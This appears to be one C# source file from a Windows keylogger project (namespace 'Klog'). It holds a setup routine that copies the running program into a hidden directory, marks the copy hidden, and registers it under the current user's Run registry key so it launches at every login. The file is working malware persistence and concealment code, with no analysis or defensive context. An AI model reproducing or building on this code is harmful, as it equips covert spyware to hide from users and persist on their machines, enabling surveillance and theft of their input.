using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Klog
{
    public partial class Save : Core
    {
        public void SetUP()
        {
            if (!Directory.Exists(hidden_dir))
            {
                DirectoryInfo create_dir = Directory.CreateDirectory(hidden_dir);
                create_dir.Attributes = FileAttributes.Directory | FileAttributes.Hidden; 
            }
            if (File.Exists(new_file))
                return;

            File.Copy(cur_file, new_file);
            File.SetAttributes(new_file, FileAttributes.Hidden);

            RegistryKey reg_key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");

            reg_key.SetValue("", new_file, RegistryValueKind.String);
        }
    }
}
